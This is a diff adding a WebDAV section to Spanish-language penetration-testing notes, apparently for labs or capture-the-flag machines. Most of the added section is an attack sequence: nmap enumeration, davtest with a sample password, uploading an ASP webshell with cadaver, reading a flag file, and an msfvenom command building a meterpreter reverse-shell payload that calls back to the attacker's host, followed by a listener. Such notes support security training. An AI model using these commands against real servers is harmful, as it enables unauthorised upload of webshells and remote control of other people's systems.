@@ -153,3 +153,27 @@ Lista de palabras para ataques de fuerza bruta
 ```python
 No hay en este caso
 ```
+
+### WebDAV - 80/443
+WebDAV (Web Distributed Authoring and Versioning) es una extensión del protocolo HTTP que permite la colaboración y la edición remota de archivos en servidores web. Opera en los puertos 80 y 443, posibilitando el acceso y la gestión de archivos a través de conexiones no cifradas (80) y cifradas (443) en entornos seguros.
+
+```python
+DavTest (tool) - valida que archivo se puede cargar
+Cadaver (tool) - para cargar archivos 
+nmap -p80 -sV --script http-enum IP (1)
+Open site web (2)
+davtest -auth bob:password_123321 -url http://IP/webdav/ (3)
+cadaver http://IP/webdav/ (4) - autenticarse
+put /usr/share/webshells/asp/webshell.asp (5) - subir la carga shell
+more C:\flag.txt
+Generar Shell Inverso
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=1234 -f asp > shell.asp
+use exploit/multi/handler or listen shell
+```
+
+#### Diccionarios
+Lista de palabras para ataques de fuerza bruta
+
+```python
+No hay en este caso
+```
